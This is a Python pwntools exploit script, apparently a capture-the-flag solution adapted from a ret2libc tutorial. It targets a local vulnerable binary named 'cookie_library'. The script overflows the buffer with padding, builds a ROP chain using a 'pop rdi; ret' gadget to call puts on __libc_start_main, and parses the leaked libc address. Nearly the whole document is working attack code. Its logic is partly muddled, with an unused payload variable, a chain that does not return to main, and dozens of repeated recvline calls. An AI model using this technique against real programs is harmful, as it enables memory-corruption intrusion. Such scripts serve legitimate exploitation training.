""" The following script was based heavily on the script provided in the following url """
"""           https://tasteofsecurity.com/security/ret2libc-unknown-libc/              """

#!/usr/bin/python3

from pwn import *
import sys

p = process("./cookie_library") # start the vuln binary
elf = ELF("./cookie_library") # Extract data from binary
rop = ROP(elf) # Find ROP gadgets

padding = b"A"*76 + b"AAAA" + b"BBBBBBBB"
testaddr = p64(0x4141414141414141)

# Find addresses for puts, __libc_start_main and a `pop rdi;ret` gadget
PUTS = elf.plt['puts']
LIBC_START_MAIN = elf.symbols['__libc_start_main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] # Same as ROPgadget --binary vuln | grep "pop rdi"

log.info("puts@plt: " + hex(PUTS))
log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
log.info("pop rdi gadget: " + hex(POP_RDI))

# Create rop chain
rop = padding + p64(POP_RDI) + p64(LIBC_START_MAIN) +  p64(PUTS)

payload = padding + rop

#Send our rop-chain payload
p.sendline(rop)

#Parse leaked address
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
received = p.recvline().strip()
print(received)
leak = u64(received.ljust(8, b"\x00"))
log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))

p.close()


#sys.stdout.buffer.write(payload + b"\n")
